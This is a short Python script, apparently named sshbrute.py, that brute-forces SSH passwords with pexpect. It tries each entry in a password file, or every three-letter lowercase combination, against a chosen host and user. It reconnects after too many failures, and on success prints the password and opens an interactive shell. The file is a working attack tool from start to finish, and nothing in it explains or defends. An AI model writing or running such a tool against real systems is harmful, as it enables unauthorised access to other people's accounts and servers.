#!/usr/bin/python

import pexpect, sys

def readFile(filename):
    passwdList = []
    file = open(filename)
    for line in file:
        passwdList.append(line.strip())
    return passwdList

def makeAlphabetString(alphabet):
    passwdList = []
    for i in alphabet:
        for j in alphabet:
            for k in alphabet:
                passwdList.append(i + j + k)
    return passwdList

def trylogin(host, user, passwdList):
    connStr = "ssh " + user + "@" + host

    child = pexpect.spawn(connStr)

    for passwd in passwdList:
        child.expect('password:')
        child.sendline(passwd)
        ret = child.expect(['\$', 'please try again.', '\(publickey,password\)'])
        if ret == 1:
            print (passwd + " is incorrect")
        elif ret == 2:
            print (passwd + " is incorrect")
            child = pexpect.spawn(connStr)
            print ("too many attempts, respawning")
        else:
            print ("SUCCESS: " + passwd + " is correct")
            child.sendline()
            child.interact()
            sys.exit()
    print "FAILURE: No password found"

if len(sys.argv) == 4:
    switch = sys.argv[1]
    host = sys.argv[2]
    user = sys.argv[3]
elif len(sys.argv) == 5:
    switch = sys.argv[1]
    filename = sys.argv[2]
    host = sys.argv[3]
    user = sys.argv[4]
else:
    switch = ""

if switch == "-f":
    passwdList = readFile(filename)
    trylogin(host, user, passwdList)
elif switch == "-g":
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    passwdList = makeAlphabetString(alphabet)
    trylogin(host, user, passwdList)
else:
    print "Syntax Error: Expected: ./sshbrute.py <-f filename|-g> <host> <username>"
